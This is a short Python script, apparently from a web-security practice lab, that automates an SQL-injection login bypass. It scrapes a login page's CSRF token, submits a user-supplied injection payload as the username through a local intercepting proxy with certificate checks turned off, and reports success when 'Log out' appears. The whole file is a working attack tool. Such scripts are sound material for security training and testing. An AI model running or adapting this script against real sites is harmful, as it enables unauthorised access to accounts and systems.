import requests
import sys
import  urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(session, url):
    r = session.get(url, verify=False, proxies=proxies) #'verify=False'=to not verify the ssl certificates.
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def exploit_sqli(session, url, payload):
    csrf = get_csrf_token(session, url)
    data = {"csrf": csrf,
            "username": payload,
            "password": "itdoesntmatter"
            }
    r = session.post(url, data=data, verify=False, proxies=proxies)
    response = r.text
    if "Log out" in response:
        return True
    else:
        return False
    
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    session = requests.Session()

    if exploit_sqli(session, url, payload):
        print("[+] SQL Injection successful!")
    else:
        print("[-] SQL Injection unsuccessful!")